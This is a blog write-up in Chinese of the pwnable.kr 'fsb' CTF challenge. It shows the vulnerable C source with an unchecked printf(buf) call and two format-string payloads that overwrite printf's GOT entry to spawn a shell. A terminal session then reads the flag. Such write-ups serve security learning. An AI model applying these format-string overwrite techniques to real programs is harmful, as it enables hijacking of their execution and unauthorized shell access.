---
title: pwnable.kr-fsb
date: 2018-02-27 14:04:54
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言
这是一道考察`printf`格式化字符串漏洞利用的题目，总的来说很简单，但是我却花了很长时间，主要是我有点太马虎没仔细分析代码，笑哭。
# 分析
先分析源代码`fsb.c`
```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
	char* args[]={"/bin/sh", 0};
	int i;

	char*** pargv = &argv;
	char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
	*pargv=0;
	*penvp=0;

	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}

	printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
	return 0;
}

int main(int argc, char* argv[], char** envp){

	int fd = open("/dev/urandom", O_RDONLY);
	if( fd==-1 || read(fd, &key, 8) != 8 ){
		printf("Error, tell admin\n");
		return 0;
	}
	close(fd);

	alloca(0x12345 & key);

	fsb(argv, envp); // exploit this format string bug!
	return 0;
}

```
程序先获得一个8字节的随机数存于全局变量`key`中，然后调用`alloca`函数在栈上分配内存。之后调用`fsb`函数。在这个函数内部要想达到`exeve`函数执行shell，就必须输入正确的`key`值。
这个`fsb`函数在`printf(buf)`处存在格式化字符串漏洞，关于漏洞利用网上有很多就不罗嗦了。那么要getshell其实方法有很多，可以改写`got`表也可以`leak`出key的值。这里直接改写`got`表好了，可以把`printf`的地址改写为要执行shell的地址，这样当执行`printf`时就跳到shell中了。
下面是exp
```bash
//各种地址和偏移在反汇编代码中就可以看出来，就不一一分析了
%134520836c%14$n //把printf的got表地址写入fsb函数的第一个参数中（方法很多你可以写到栈上的很多位置）
%134514347c%20$n //向printf的got表写入要执行shell的地址
```
```bash
fsb@ubuntu:~$ ./fsb >/dev/null 2>&1
%134520836c%14$n
%134514347c%20$n
cat flag >/tmp/flag
exit
fsb@ubuntu:~$ cat /tmp/flag
Have you ever saw an example of utilizing [n] format character?? :(
fsb@ubuntu:~$ 
```
要注意的是需要把程序的标准输出和错误输出重定向到`/dev/null`，这样就不会因为输出数据过多而卡死了。
# 总结
还是简单的格式化字符串漏洞的题目，利用方法很多，当时因为一直想通过`alloca`函数来计算`key`而浪费了很多时间，然而这样计算出来的只是前4字节，唉要细心啊。。